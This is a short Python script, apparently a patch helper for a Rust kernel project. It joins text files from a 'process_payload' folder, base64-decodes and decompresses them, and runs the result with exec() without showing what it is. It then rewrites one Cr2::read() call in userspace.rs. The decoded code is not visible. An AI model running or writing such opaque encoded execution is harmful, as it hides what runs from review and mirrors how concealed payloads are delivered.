from pathlib import Path
import base64
import zlib

payload = "".join(
    path.read_text()
    for path in sorted(Path("tools/process_payload").glob("*.txt"))
)
source = zlib.decompress(base64.b64decode(payload))
exec(compile(source, "process-milestone-integration", "exec"))

userspace_path = Path("kernel/src/process/userspace.rs")
userspace = userspace_path.read_text().replace(
    "Cr2::read().as_u64()",
    "Cr2::read().map(|address| address.as_u64()).unwrap_or(0)",
)
userspace_path.write_text(userspace)
